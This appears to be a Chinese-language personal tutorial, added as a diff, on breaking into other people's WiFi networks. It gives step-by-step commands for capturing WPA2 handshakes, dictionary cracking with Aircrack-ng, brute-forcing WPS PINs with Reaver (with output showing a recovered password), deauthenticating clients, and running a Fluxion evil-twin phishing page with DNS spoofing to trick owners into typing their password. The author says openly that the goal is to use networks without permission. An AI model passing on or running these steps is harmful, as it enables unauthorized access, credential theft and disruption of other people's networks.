@@ -1,0 +1,960 @@
+❤️️ 基本知识:
+
+
+
+🔵 Aircrack-ng
+
+    破解wifi 最出名的就是 Aircrack-ng 套件.
+    这个套件可以安装在Linux下. 也能安装在Mac下.
+    ❗️❗️❗️ 强烈建议在Kali下使用Aircrack-ng套件. 同样的套件 Kali下的功能比Mac强大多了.
+    ❗️❗️❗️ 强烈建议在Kali下使用Aircrack-ng套件. 同样的套件 Kali下的功能比Mac强大多了.
+    ❗️❗️❗️ 强烈建议在Kali下使用Aircrack-ng套件. 同样的套件 Kali下的功能比Mac强大多了.
+
+    Linux 可以使用Aircrack-ng 套件里的所有套件.
+    Mac 只能用aircrack-ng suite.中的某几个组件!!! 
+    当然Mac也是可以用来破解wifi的.下面简介Mac用字典暴力破解wifi
+
+    🔸 Airport
+        其实OSX本身有个命令行工具：airport，利用这个工具可以方便的实现airmon-ng中的某些功能!!!比如查看附近wifi.
+
+        /System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport 
+        最好添加airport的环境路径. 不然用airport 每次都要输这么长的命令...
+
+    🔸 Mac Airport 查看附近 wifi：
+        /System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport en0 scan
+          219 6c:b0:ce:bd:d1:5b -27  3       N  -- WPA2(PSK/AES/AES)
+          219-5 6c:b0:ce:bd:d1:5a -26  153   Y  -- WPA2(PSK/AES/AES)
+
+    🔸 Mac 安装 aircrack-ng 套件.   brew install aircrack-ng
+
+    🔸 Mac 抓握手包.
+        sudo /System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport en0 sniff 3
+
+          en0   本机无线网卡设备；
+          sniff 嗅探.
+          3     要破解wifi的信道
+          结束抓包后的数据保存在/tmp.
+
+          等待一段时间，后就可以按control+C结束监听，
+          ❗️ 这里就是为什么不推荐用Mac来抓包了.
+          Mac下你完全不知道是否抓到握手包了.
+          用Kali 抓包 就能实时显示是否抓到握手包.
+
+          这时看到提示，一个airportSniffXXXXXX.cap的文件被保存在/tmp文件夹中。
+          现在就可以使用类似wireshark之类的网络分析工具在线下打开它了。
+
+          现在你用手机去连 219 这个wifi.连上后就可以停止抓包(Ctrl + C)了..
+          ❗️ 连wifi: 不一定要输入wifi密码.如果别人之前连过wifi的.只要打开wifi 也算连的! 也可以获取握手包.
+          ❗️ 人家走来走去. 就会不停的连wifi. 所以这个 握手包是比较容易获得的. 重点就是字典密码..
+
+    🔸 Mac 分析破解握手包
+        sudo aircrack-ng -w ~/passwords.txt /tmp/airportSniffCd2nGz.cap | grep handshake
+          1  6C:B0:CE:BD:D1:5B  219                       WPA (1 handshake)
+          2  CC:81:DA:41:BE:58  @PHICOMM_50               WPA (0 handshake)
+          3  D8:49:0B:A7:47:F0  ChinaNet-Ccfr             WPA (0 handshake)
+
+              -w：  指定字典文件路径；
+              －b： 指定要破解的wifi 地址
+              /tmp. 抓包文件路径.
+              grep: 有抓到 handshake 数据包的wifi才能进行下一步的破解!!.
+                    上面只有第一个是可以用字典开尝试出对方密码的.
+                    这里必须用grep. 你抓到的数据是成千上万条. 你必须进行过滤.
+                    handshake 前面的数字不为0的才有用. 
+                    handshake 前面的数字为0的都没用的.
+
+
+
+🔵 握手包
+
+    wifi破解中对我们最重要的数据包是：包含密码的包----也叫握手包。
+    当有新用户或老用户断开后自动连接wifi时，都会发送握手包.
+
+
+
+  🔵 wifi 破解思路.
+
+    4种方法. 强烈建议按顺序尝试.方法选择很重要!!!  
+    
+    🔸1.  尝试各种wifi钥匙.
+
+    🔸2.  wps (Reaver)破解: 
+
+            路由器 wps 功能:
+            WPS用于简化Wi-Fi无线的安全设置和网络管理。
+
+            它支持两种模式：
+            个人识别码(PIN)模式和按钮(PBC)模式。
+            路由器在出产时默认都开启了wps但这真的安全么！
+
+            个人码(PIN)
+            有人可能会问了什么是pin码？
+            WPS技术会随机产生一个八位数字的字符串作为个人识别号码（PIN）
+            Pin码会分成前半四码和后半四码。
+            前四码如果错误的话，那路由器就会直接送出错误讯息，而不会继续看后四码，意味着试到正确的前四码，最多只需要试 10000 组号码。
+            一旦没有错误讯息，就表示前四码是正确的，而我们便可以开始尝试后四码。 
+            后四码比前四码还要简单，因为八码中的最后一码是检查码，由前面七个数字产生，
+            因此实际上要试的只有三个数字，共一千个组合。
+            这使得原本最高应该可达一千万组的密码组合（七位数+检查码），瞬间缩减到仅剩 11,000 组，大幅降低破解所需的时间.
+
+            根据路由MAC地址算出默认pin码
+            另外有种更快破解wifi的方法就是根据路由MAC地址（MAC是路由器的物理地址，是唯一的识别标志）算出默认出产时的pin码例如以下软件 还可以通过别人共享的找到pin码！
+
+            腾达某款某Mac地址能算出路由器的Pin码
+            适用于MAC地址前6位为“C83A35/00B00C”的无线路由器
+            为了确保Pin的真实性,最好用 Inflator （俗称:打气筒) 进行验证一下,顺便跑出PSK密码,一般输入计算出来的前五位数
+            接下来就交给打气筒跑，这样才能更好的保证密码出来.
+
+
+            如果无线路由器开启了WPS，60+% 的路由器都开启这个wps功能!! 就可以用这种攻击方法.成功率极高.
+            
+            WPS的pin码并没有加密,Reaver会暴力破解pin码，
+            找到pin码也就找到了密码。一般用 2-12小时.就能破解.
+            当然有效高级点的路由器有保护机制. 
+            你尝试次数过多就不然你尝试. 如下面的提示.这样就只能换别的方法了.
+            [+] Sending EAPOL START request
+            [!] WARNING: Receive timeout occurred            
+
+
+
+
+    🔸3. Fluxion 破解:
+            fluxion 无线破解工具，原理更偏向于社会工程学中的钓鱼.
+            让wifi主人自己输入密码. 免去跑包时间
+
+            Fluxion 创建一个名字和对方一模一样的假wifi. 
+            Fluxion 利用攻击 强制断线对方路由器下所有客户端. 
+            被踢的客户端手动连接到我们的假wifi.
+            连接过程中我们的假wifi会弹框要求输入真路由器的wifi密码. 
+            对方输对了就停止攻击. 就获得对方密码了.
+            对方输错了就一直攻击. 
+
+
+    🔸4.  跑包 - 暴力破解: 
+            用密码字典暴力破解.费时费力费电.是没办法的办法. 破解率只有30%左右.
+            对方是弱密码就好破解.对方强密码就很难破解.
+            简单点说 你的字典里有对方密码.那么就能破解.不然就没戏..
+            重点就是字典. 找字典也麻烦. 而且字典大小往往5G+ 的...
+
+            暴力破解就是抓取一个 对方wifi的握手包.
+            这个握手包里有对方路由器 用wpa2加密方式加密后的密码的!!!
+            加密是不可逆的! 
+                你可以用 wpa2 方式加密 12345678 这个密码, 得到很长一串加密后的密码 xxxxxxx.
+                就算你获取了 xxxxxxx 这个加密后的密码(这里也就是握手包). 
+                也知道对方是用wpa2这种加密方式加密的.
+                但是你是算不出 12345678 这个密码的.
+                你能做的只能是尝试. 
+                你的爆破字典里有千万密码. 
+                每个密码都用wpa2 这个加密方式得到对应的加密后的密码. 
+                用这个加密后的密码 和 wifi握手包里的加密后的密码对比. 
+                如果一致就说明找到密码了.
+
+
+      🔸 5. 路由器漏洞 ???  未亲测!!!
+
+              路由器本身就有一些漏洞.
+              暴力破解还不行的话.可以考虑利用路由器漏洞
+
+              Routerpwn 只是一个网站 但是可以直接查看路由器漏洞.
+              http://routerpwn.com/
+
+              这个网站 列出很多的路由器厂家.比如国内最常见的  tplink 
+              左边是漏洞种类. 右边是 该漏洞涉及的型号
+
+              网页漏洞 右边 有个设置IP的. 填上路由器的IP地址.
+              然后 跳出登录界面. 一般都是 admin admin
+
+              ## arpspoof
+              Arpspoof是一个非常好的ARP欺骗的源代码程序。它的运行不会影响整个网络的通信，该工具通过替换传输中的数据从而达到对目标的欺骗。
+
+
+
+
+🔵 暴力破解 简介:
+
+  5 位数密码 普通电脑破解 2-7天
+  10位数密码 普通电脑破解 x年!!
+
+🔸 Tables 
+
+    在很多年前，国外的黑客们就发现单纯地通过导入字典，采用和目标同等算法破解，
+    其速度其实是非常缓慢的，就效率而言根本不能满足实战需要。
+    之后通过大量的尝试和总结，黑客们发现如果能够实现直接建立出一个数据文件，
+    里面事先记录了采用和目标采用同样算法计算后生成的Hash散列数值，
+    在需要破解的时候直接调用这样的文件进行比对，破解效率就可以大幅度地，甚至成百近千近万倍地提高，
+    这样事先构造的Hash散列数据文件在安全界被称之为Table表(文件)。
+
+
+🔸 Rainbow Tables
+
+    最出名的Tables是Rainbow Tables，即安全界中常提及的彩虹表，它是以Windows的用户帐户LM/NTLM散列为破解对象的。
+    在 Windows2000/XP/2003系统下，账户密码并不是明文保存的，而是通过微软所定义的算法，保存为一种无法直接识别的文件，即通常所说的SAM文件，
+    这个文件在系统工作时因为被调用所以不能够被直接破解。
+    但我们可以将其以Hash即散列的方式提取，以方便导入到专业工具破解，提取出来的密码散列类似于下面：
+
+    1、Administrator:500:96e95ed6bad37454aad3b435b51404ee:64e2d1e9b06cb8c8b05e42f0e6605c74:::
+
+    若是以传统破解方式而言，无论是本地，还是内网在线破解，效率都不是很高。
+    据实际测试，单机环境下，破解一个14位长包含大小写字母以及数字的无规律密码，一般是需要3~~9小时的，
+    这个时间值会随着密码的复杂度及计算机性能差异提升到几天甚至数月不等。
+    虽然说大部分人都不会使用这样复杂的密码，但对于目前很多密码足够复杂并且长度超过10位的密码比如“Y1a9n7g9z0h7e”，还是会令黑客们头痛不已。
+
+    2003年7月瑞士洛桑联邦技术学院Philippe Oechslin公布了一些实验结果，他及其所属的安全及密码学实验室(LASEC)采用了时间内存替换的方法，使得密码破解的效率大大提高。作为一个例子，他们将一个常用操作系统的密码破解速度由1分41秒，提升到13.6秒。这一方法使用了大型查找表对加密的密码和由人输入的文本进行匹配，从而加速了解密所需要的计算。这种被称作“内存-时间平衡”的方法意味着使用大量内存的黑客能够减少破解密码所需要的时间。
+
+    于是，一些受到启发的黑客们事先制作出包含几乎所有可能密码的字典，然后再将其全部转换成NTLM Hash文件，这样，在实际破解的时候，就不需要再进行密码与Hash之间的转换，直接就可以通过文件中的Hash散列比对来破解Windows帐户密码，节省了大量的系统资源，使得效率能够大幅度提升。当然，这只是简单的表述，采用的这个方法在国际上就被称为Time-Memory Trade-Off ，即刚才所说的“内存-时间平衡”法，有的地方也会翻译成“时间—内存交替运算法”。其原理可以理解为以内存换取时间
+
+
+
+  🔸 Misc
+    正是由于Rainbow Tables的存在，使得普通电脑在5分钟内破解14位长足够复杂的Windows帐户密码成为可能。
+    如上图4可以看到，类似于c78j33c6hnws、yemawangluo178、38911770这样的Windows帐户密码几乎全部在180秒即3分钟内破出，最短只用了5秒，个别稍长的密码破解开也没有超过3分钟。
+
+
+    现在，在理解了“内存-时间平衡”法和Table的存在意义后，让我们回到无线领域，破解WPA-PSK也是同样的意思。在2006年举行的RECON 2006安全会议上，一位来自Openciphers组织的名为David Hulton的安全人员详细演示了使用WPA-PSK Hash Tables破解的技术细节，给与会者极大的震动。
+
+    下面所示的为会议上引用的WPA加密以及主密钥对匹配等建立WPA Tables所需理念的原理图，其中，MK为密码原文，PMK就是通过PBKDF2运算所得出的数值，PTK就是在PMK的基础上进行预运算产生的WPA Hash，这个Hash将用来和WPA 握手包中的值对照，若匹配即为密码。
+
+    当然，要说明的是，Tables的建立并没有想象的那么容易，就建立本身而言，其效率非常低下，加上需要指定预攻击AP的SSID，想要建立一套针对所有常见接入点，并采用简单密码的WPA-PSK Hash Tables，其生成文件占据的硬盘空间最少也要1~~3G
+
+
+    不过，对于无线网络管理员，并不能因此松一口气，真正的噩梦才刚刚开始，因为这个方法也同样适用于破解WPA2加密。而且，国外一些地下高级黑客组织，也已经建立了高达500G的详尽WPA/WPA2攻击Table库，甚至一些基本完善的WPA-PSK Hash Tables已经在黑客网站上开始公开出售，只需要支付120美金左右，就会有8张包含WPA-PSK Hash Tables 的DVD光盘通过Fedex直接送到你的手上。
+
+
+
+
+  🔸 暴力破解加速
+    wpa 加密的无线很容易收到 字典攻击.
+    普通电脑 跑一个好点的字典需要 几天/几星期.
+    但是有网站专门提供破解wifi的字典. 并且提供强大的服务器.帮你破解密码!!!!
+    只需要几十分钟/几小时就可以...
+
+    字典: 有很多
+    普通字典.  500MB .能破解20%的wifi.
+    中国拼音字典、手机字典、字母数字字典.
+    服务器资源有限. 不可能每个wifi都跑一个非常非常大的字典的..
+
+    收费跑包网站... https://gpuhash.me/?menu=cn-main
+        简单字典免费跑.但是跑出的密码 要 0.005btc..
+        高级字典不管是否成功 收费 0..15 BTC 
+
+
+
+
+
+
+
+
+
+  🔵 wifi 三种加密方式: 
+        wep   非常少见,已过时
+        wpa   少见.
+        wpa2  最最常见
+
+            不同的加密方式的wifi密码破解难度不一样.
+            wep加密方式很古老了.几乎见不到了.分分钟就能破解. 
+            wpa 加密方式也很少见. wpa2 加密方式是最常见的. 本文就以wpa2 为例.
+
+
+            🔸 wep 破解简介
+                只要获得足够的 beacons 和 data 数据就可以破解.
+                理想情况下是100000+。你可以等，也可以使用aireplay加快这个进程。
+
+                aireplay-ng -1 0 -a C8:3A:35:30:3E:C8 wlan0mon
+                aireplay-ng -3 -b C8:3A:35:30:3E:C8 wlan0mon
+                                          等到抓取的数据充足，Ctrl+C停止
+
+                aircrack-ng ~/*.cap       开始破解
+                airmon-ng stop wlan0mon   最后.结束无线网卡的监控模式：
+
+
+
+
+
+
+🔵Aircrack-ng  
+    破解无线 WPA2 加密的工具套装. 了解就好.不必深入.
+
+    🔸aircrack-ng
+      主要用于WEP及WPA-PSK密码的恢复，
+      只要airodump-ng收集到足够数量的数据包，aircrack-ng就可以自动检测数据包并判断是否可以破解
+
+    🔸airmon-ng
+        用于改变无线网卡工作模式，以便其他工具的顺利使用
+        🔅 sudo airmon-ng start wlan0mon 
+          wlan0mon 参考 ifconfig 里的无线网卡名称
+          本来是 wlan0 开启监听模式后 就变成 wlan0mon 了 
+          用于嗅探的网卡是一定要处于monitor监听模式地,对于无线网络的嗅探也是一样。
+
+    🔸airodump-ng     查连接路由器的客户端的 Mac
+        🔅 sudo airodump-ng wlan0mon
+          bssid  是路由器 mac 地址
+          station 是客户端/手机的 mac 地址
+          这里能看到 那个路由器下面 连了哪个手机.
+
+        🔅sudo airodump-ng --ivs –w longas -c 6 wlan0mon
+            —ivs  设置过滤    减少文件大小
+            —c  设置 要进行攻击/破解的路由器的 工作频道 
+            —w 保存文件名 w=write 的意思 生成的文件 文件名会变成 longas-01.ivs 第一次攻击 就是longas-01.ivs 第二次攻击 就是  longas-02.ivs
+
+
+    🔸aireplay-ng
+        在进行WEP及WPA-PSK密码恢复时，可以根据需要创建特殊的无线网络数据报文及流量
+
+        若连接着该无线路由器/AP的无线客户端正在进行大流量的交互，比如使用迅雷、电骡进行大文件下载等，则可以依靠单纯的抓包就可以破解出WEP密码。
+
+        但是无线黑客们觉得这样的等待有时候过于漫长，于是就采用了一种称之为“ARP Request”的方式来读取ARP请求报文，并伪造报文再次重发出去，以便刺激AP产生更多的数据包，从而加快破解过程，这种方法就称之为ArpRequest注入攻击。
+
+        具体输入命令如下：
+        aireplay-ng -3 -b AP的mac -h 客户端的mac wlan0mon 
+
+        参数解释：
+        -3 指采用ARPRequesr注入攻击模式；
+        -b 后跟AP的MAC地址，这里就是前面我们探测到的SSID为TPLINK的AP的MAC；
+        -h 后跟客户端的MAC地址，也就是我们前面探测到的有效无线客户端的MAC；
+        最后跟上无线网卡的名称，这里就是mon0啦。
+        回车后将会看到如下图12所示的读取无线数据报文，从中获取ARP报文的情况出现。
+
+
+
+    🔸airserv-ng    可以将无线网卡连接至某一特定端口，为攻击时灵活调用做准备
+    🔸airolib-ng    进行WPA Rainbow Table攻击时使用，用于建立特定数据库文件
+    🔸airdecap-ng   用于解开处于加密状态的数据包
+
+
+
+
+
+
+🔵  查看隐藏ssid.
+    查看wifi的时候 有些wifi名字是 length xx 的 没有ap名. 但是bssid 还是有的.
+    这些路由器就是隐藏了ssid的!!!  要找出ssid 很简单.
+    
+    查看ssid 方法:
+    # airodump-ng -c 6 --bssid C8:3A:35:30:3E:C8 wlan0mon
+    # aireplay-ng -0 30 -a C8:3A:35:30:3E:C8 -c B8:E8:56:09:CC:9C wlan0mon
+    破解密码的方法不变；使用上面两个命令就可以轻松得到ap名。
+    事实证明，隐藏SSID并不管啥事；其实设置一个复杂的密码比隐藏SSID要管用的多。
+
+
+
+
+🔵 wifi 蜜罐
+
+    假冒的系统. 对对方进行监控...
+
+    “热点蜜罐”(Hot-spot Honeypot)，吸引试图连接到WiFi的设备。
+    WiFi Pineapple能伪装成用户的设备在“寻找”的WiFi网络。
+    WiFi Pineapple只适用于没有加密的WiFi网络，对使用WPA加密的WiFi网络不起作用
+
+    cain&able 局域网渗透的工具，能看到对方很多密码的明文，对方都上了那些网站，自己去看看教程吧，很老的工具了。
+    应该还有更好使的，我就不太清楚了。
+    PS：架设蜜罐WIFI很不道德………………
+
+    初级：可以看上网记录  ps：http
+    用你电脑建立wifi，ssid设置为他人曾经连接过的ssid名称，然后打开抓包软件（wireshark）设定好网卡（你发送wifi的网卡）开始抓取，然后看对应的协议层数据就行了。
+
+
+
+
+
+
+
+
+
+  🔵 软硬件环境:
+    Kali (必须) + USB无线网卡(必须): Netgear WNA1100 
+
+    🔸 Kali 
+          可以是虚拟机. 也可以是实体机.  强烈建议用虚拟机.非常方便!!
+          如果是Kali虚拟机, 要让Kali识别无线网卡.就必须用外置无线网卡.
+          如果是Kali实体机. 要让Kali识别无线网卡.可以用笔记本内置网卡.
+
+          Kali开启 ssh
+              - vi /etc/ssh/sshd_config
+                  PermitRootLogin yes  这行改成这样.
+              - service ssh restart
+              - service ssh status
+
+
+    🔸 无线网卡
+
+        不管实体机是用有线还是无线上网的. 到了虚拟机都是有线方式上网的.
+        
+        比如要用kali虚拟机来破解wifi,那么必须要让虚拟机可以使用无线网卡.
+        由于虚拟机的种种原因.
+        虚拟机不能使用笔记本内置的无线网卡!!!只能在笔记本上再插个外置USB无线网卡.
+
+        ❗️❗️❗️如果虚拟机里要使用无线网卡,只能使用外置无线网卡!❗️❗️❗️
+        ❗️❗️❗️如果虚拟机里要使用无线网卡,只能使用外置无线网卡!❗️❗️❗️
+
+        ❗️❗️❗️不是所有无线网卡都能在Linux下运行的!!要看型号的.❗️❗️❗️
+        ❗️❗️❗️不是所有无线网卡都能在Linux下运行的!!要看型号的.❗️❗️❗️
+
+          🔸 查看虚拟机无线网卡情况
+              ifconfig → 出现类似 wlan0的(wlan开头的)才说明虚拟机识别到了无线网卡.
+              如果你用虚拟机运行Kali. 不用外置的USB网卡 是永远也不会有wlan网卡出现的.
+              别多想了. 20块钱的WNA1100无线网卡. 最最便宜的了.买吧.
+
+          🔸 Kali 虚拟机推荐USB网卡:
+              - Netgear WNA1100 我用的那个...淘宝 20块钱一个!!!
+              - TP-LINK WN722N 要v1版本. 不要V2版本.贵! 得150￥+  不推荐..... 
+
+          🔸 Kali VM虚拟机无线网卡驱动
+              Netgear WNA1100 至少在 kali 2016.2 版本是免驱的. 插上连到虚拟机就能用
+
+
+
+
+
+
+
+
+
+
+⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️--WPS 破解---⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️
+
+如果发送pin码过快，有可能造成路由器崩溃；就类似对服务器的DDOS攻击。
+
+🔅 airmon-ng start wlan0   开启无线网卡监控模式   
+🔅 airodump-ng wlan0mon    查看四周所有 wifi      
+🔅 wash -i wlan0mon -C     查看四周开启wps的 wifi      
+
+BSSID                  Channel       RSSI       WPS Version       WPS Locked        ESSID
+------------------------------------------------------------------------------------------
+F0:B4:29:DA:BB:84       8            00        1.0               No                (null)
+A8:57:4E:D1:ED:6A      11            00        1.0               No                T2-20B
+50:BD:5F:4C:44:C7       3            00        1.0               No         Birdhouse 2.4G
+
+如果什么也没有表示周围没有开启WPS的无线路由器。记住要破解wifi的BSSID。
+wps locked 下是no  ➜  wps 没有被关闭.  ➜ 也就是说wps是开启的...
+
+🔅 reaver -i wlan0mon -b E4:D3:32:B4:83:BC -vv -a    开始破解 接下来就是等... 2-10个小时...
+   👁‍🗨 有些路由器对pin破解次数有一点限制. 会自动停止几秒.再自动破解. 反正等就是了..
+
+    [+] Sending M2 message
+    [P] E-Hash1: 59:24:ff:26:5d:e6:7f:54:d5:ef:aa:fa:5b:15:25:8e:5b:d1:3e:3d:db:bf:69:92:a6:ef:20:ad:23:ad:10:d9
+    [P] E-Hash2: 9d:be:01:06:88:40:4d:ef:61:7d:6e:0d:e7:12:bc:6f:88:fd:b6:34:d2:9d:67:22:0b:b4:72:9d:dd:87:aa:e0
+    [+] Received M3 message
+    [+] Sending M4 message
+    [+] Received M5 message
+    [+] Sending M6 message
+    [+] Received M7 message
+    [+] Sending WSC NACK
+    [+] Sending WSC NACK
+    [+] Pin cracked in 31654 seconds
+    [+] WPS PIN: '31070003'
+    [+] WPA PSK: 'njs236121'
+    [+] AP SSID: 'MERCURY_210'
+
+      👹 njs236121 就是wifi密码了!!!!  等了8.8小时.
+
+
+
+🔵 Reaver 命令详解
+
+  reaver -i mon0 -b mac -S -v 
+    -i 监听后接口名称
+    -b 目标mac地址
+    -a 自动检测目标AP最佳配置
+    -S 使用最小的DH key（可以提高PJ速度）
+    -vv 显示更多的非严重警告
+    -d  即delay每穷举一次的闲置时间 预设为1秒
+    -t  即timeout每次穷举等待反馈的最长时间
+    -c  指定频道可以方便找到信号，如-c1 指定1频道
+
+    示例: 
+    🔸 reaver -i mon0 -b MAC -a -S –d9 –t9 -vv
+    　 reaver -i wlan1 -b 54:E6:FC:35:C5:82 -S -N -vv -c 4
+
+  　　应因状况调整参数（-c后面都已目标频道为1作为例子）
+  　　目标信号非常好: reaver -i mon0 -b MAC -a -S -vv -d0 -c 1
+  　　目标信号普通: reaver -i mon0 -b MAC -a -S -vv -d2 -t 5 -c 1
+  　　目标信号一般: reaver -i mon0 -b MAC -a -S -vv -d5 -c 1
+
+      在穷举的过程中，reaver会生成以路由mac地址为名的wpc文件,
+      这个文件在kali系统中/etc/reaver/文件夹下。
+      一时半会pin不出来，过段时间pin的时候命令加参数 -s file.wpc，就会根据之前的进度继续pin。
+
+　 🔸 注意点：
+
+　　1.一般reaver 前四位默认是从0开始，如果想从指定的数值开始爆破需要添加-p参数：
+      -p 9000,这个意思就是从9000开始，只要不pin死路由器，可以多开几个窗口，从不同的数值开始。
+
+　　2.最后pin完最后会显示WPS PIN(正确的pin码)和WPA PSK(wifi密码)，
+      同时如果WPS功能没关，pin码没修改，无论怎样修改密码，都可以通过pin码获取wifi密码: 
+      reaver -i mon0 -b mac -p pin码，来再次得到密码
+
+　　3.一般pin的过快，会把路由器pin死，所以一般还会加上-d5 -t5参数，添加5秒延时，当然数值可以自己改。
+ 
+　  4.防范措施：
+　　  - WPS功能对个人基本上没啥作用，还是关了吧。
+　　  - 现在的路由一般会有防pin措施，例如会有300秒pin限制，但这个是伪防pin,作用不是很大
+
+
+
+🔵 无线中继 (可选)
+    Wi-Fi密码是有了.但是信号不好啊!!! 怎么办.  如果你自己有路由器的话可以用无线中继.
+
+    🔸 WDS
+      必须两台路由器都具有 WDS功能 才能实现中继.
+      另外，目前WDS还非国际标准，跨品牌产品之间的无线中继，不能保证一定成功....
+
+    🔸 加密方式
+    　　无线局域网应用的日益普及，安全加密尤为必要。但使用WDS时，加密的选择有一定的局限性。
+    　　❗❗️❗️️ 使用NETGEAR无线路由器进行无线中继时，仅支持WEP加密❗️❗️❗️
+    　　❗❗️❗️️ 使用NETGEAR无线路由器进行无线中继时，仅支持WEP加密❗️❗️❗️
+    　　❗❗️❗️️ 使用NETGEAR无线路由器进行无线中继时，仅支持WEP加密❗️❗️❗️
+
+    　　❗️❗️❗️ 无线中继的两个设备，必须选择相同的加密方式、和密码️❗️❗️❗️
+    　　❗️❗️❗️ 无线中继的两个设备，必须选择相同的加密方式、和密码️❗️❗️❗️
+    　　❗️❗️❗️ 无线中继的两个设备，必须选择相同的加密方式、和密码️❗️❗️❗️
+
+        👁‍🗨 也就是说. 对方路由器是wap2-psk 加密的. 
+        如果你想用网件的路由器来做中继. 那么只能改对方路由器的加密方式.
+        但是 我们这里是蹭网的. 改人家密码不合适.... 算了...
+
+    🔸 信道
+        必须首先将对方频道/信道改为固定的数值，推荐使用1、6或11。 不要使用自动!!!
+
+    🔸 SSID 
+      SSID可以相同，也可以不同。
+      如果希望无线客户端在两个无线路由器的范围内实现漫游，请将SSID设为相同
+      一般没必要. 肯定是信号不好才要中继的.
+
+    🔸 对方路由器开启中继 水星路由器
+
+    开启 wds功能 ➜ 扫描 ➜  选择你的路由器 ➜  密钥那里 填你的路由器的wifi密码
+
+
+    🔸 自己路由器开启中继 网件路由器
+
+        🔸 加密模式  必须选择.. wep  密码长度是 10位数以上如:  1234567899
+
+        🔸 开启wds
+          点击左侧菜单中的高级->无线中继功能，设置中继：
+      　　在“启用无线中继功能”前打钩；
+      　　选择“无线中继器”模式，在“基站MAC地址”中，填入路由器A的MAC地址；
+
+
+
+
+
+
+
+
+
+⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️--Fluxion 破解---⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️
+
+🔵 简介
+    可以迅速帮你检查所需要的插件并进行安装,在短时间内搭建出一个完整的钓鱼环境。
+    而且在新版中增加了对中文的支持，这是国外好多安全工具没有的。
+
+🔵 工作原理（大体步骤）
+
+　　1.扫描周围WIFI信号
+　　2.抓取握手包(这一步的目的是为了之后验证WiFi密码是否正确)
+　　3.使用WEB管理界面
+　　4.启动一个假的AP实例来模拟真的AP
+　　5.会生成一个MDK3进程。该进程会取消对连接到目标网络的所有用户的认证，可以诱使他们连接到FakeAP并输入WPA密码。
+　　6.启动伪DNS服务器以捕获所有DNS请求并将它们重定向到运行攻击脚本的主机.
+　　7.随后会弹出一个窗口提示用户输入正确的WiFi密码
+　　8.用户输入的密码将和第二步抓到的握手包做比较来核实密码是否正确
+　　9.一旦提交正确的密码，攻击将自动终止.这个程序是自动化运行的，并且能够很快的抓取到WiFi密码
+
+
+🔵 fluxion 最新地址:   https://github.com/wi-fi-analyzer/fluxion
+
+
+🔵 安装依赖 & 启动:
+    👁‍🗨 fluxion目录下有一个‘Installer.sh’脚本文件，运行后会自动更新或安装缺少的工具。
+
+    apt-get install git
+
+    git clone https://github.com/Xu-Jian/fluxion
+    cd fluxion && ls
+    ./fluxion
+
+    这里的命令 不能在ssh中执行.需要到虚拟机中去..
+
+    运行这个 ./fluxion首先检测软件的所需依赖.
+    没安装的 就去安装!!!! 如:
+    🔸Dhcpd
+        apt-get update
+        apt-get dist-upgrade
+        apt-get install isc-dhcp-server -y
+
+    🔸Hostapd
+      sudo apt-get install hostapd dnsmasq
+
+    🔸lighttpd
+      sudo apt-get install lighttpd
+
+    🔸php5-cgi
+      ❗️❗️❗️❗️ apt-get install php-cgi
+      不要用   apt-get install php5-cgi
+      
+      kali 2016 默认用的是 php7 不是php5 .
+      这里安装 php-cgi 就可以了.
+
+
+🔵 选择语言 ➜ 6 
+🔵 选择网卡 ➜ 1     网卡的话需要大家自己分辨，但是信道选项一般都是选择第一个 
+🔵 选择信道 ➜ 1     
+    选择完后它会对网卡周围的WiFi进行扫描，扫描到你要破解的WiFi后按Ctrl+C停止。
+
+    👹 这里会中文乱码..
+
+      locale -a 查看当前系统支持的字符集。
+
+      解决策略：
+      （以下 的步骤中，可能有冗余的地方，毕竟是自己亲自摸索的，有些地方还是有些不大确定。）
+      1.在命令行输入”dpkg-reconfigure locales”。进入图形化界面之后，（空格是选择，Tab是切换，*是选中），选中en_US.UTF-8和zh_CN.UTF-8，确定后，将en_US.UTF-8选为默认。
+      2.安装中文字体，”apt-get install xfonts-intl-chinese “和” apt-get install ttf-wqy-microhei”
+      3.重启
+      4.这时发现网页不乱码，系统也不乱码，但是是英文的界面。打开系统设置，找到设置语言的地方，将语言再改为汉语（中国），再重启。
+      5.这时发现系统又变为中文的界面了。
+
+
+🔵  ctrl c  然后选择一个目标 wifi   
+
+🔵 选择目标后 出现WIFI的基本信息及攻击选项 选择‘1 伪装AP’
+
+🔵 输入握手包存放路径 我们按回车使用默认路径
+
+
+🔵 选择抓取握手包的工具 我们选择第一个 aircrack-ag套件
+
+🔵 选择攻击方式 我们选择‘1’对所有目标发起deauthentication攻击
+    mdk3 攻击方式参考 http://ixuehua.blog.163.com/blog/static/25995203820163285235464/
+
+
+🔵 出现两个窗口，
+一个是deauthentication攻击，此时连在目标路由器的客户端会强制解除验证解除连接掉线；
+另一个是aircrack等待抓取握手包，客户端在掉线后重新连接时会抓取握手包。
+当在aircrack窗口出现WPA handshake时证明已经抓到握手包，
+然后我们选择‘1 检查握手包’
+
+🔵 选择获取密码的方式，
+第一种 web注入 也是我们今天只要介绍的 
+第二种跑包（暴力破解）之前的文章已经说过 这里我们选泽‘1’
+
+
+
+🔵 选择web页面语言，
+包括了大部分路由器品牌的页面，
+当然我们也可以根据自己的需要在 /fluxion/Sites/ 修改页面。本次演示我们选择7 中文通用页面
+
+这时fluxion会调用多个工具对原有路由器进行攻击，并迫使客户端连接到我们伪造的ap中，
+同时对dns进行欺骗将客户端流量转到我们的钓鱼页面
+
+
+手机会断开原来的wifi 并连接到我们伪造的ap 并弹出认证页面 
+由于对dns进行了转发，所以即时关闭认证页面 只要打开任意页面都会转到到这
+
+
+这时只要用户打开浏览器，就会转到输入WiFi密码的页面。
+
+
+在通过对比密码正确后，fluxion会关闭伪造的ap 使客户端重新连接到原来的ap 并给出ap密码 退出程序
+
+
+有问题. 明明密码对的也 提示不对..
+试试 其他语言的就可以了...
+
